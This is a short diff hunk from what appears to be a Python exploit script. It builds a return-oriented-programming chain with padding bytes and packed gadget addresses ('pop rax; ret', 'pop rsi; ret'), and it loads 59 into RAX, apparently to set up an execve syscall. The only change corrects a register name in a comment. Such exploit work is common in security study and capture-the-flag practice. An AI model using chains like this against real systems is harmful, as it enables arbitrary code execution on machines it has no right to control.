@@ -23,7 +23,7 @@ shellcode += 'B' #We add 1040 characters
 #shellcode += 'B'
 
 
-shellcode += struct.pack('<q', g1) 	# pop eax; ret
+shellcode += struct.pack('<q', g1) 	# pop rax; ret
 shellcode += struct.pack('<q', d1)  # value to set in RAX (59)
 shellcode += struct.pack('<q', g2)  # pop rsi; ret
 shellcode += struct.pack('<q', d2)	# 0 for rsi 
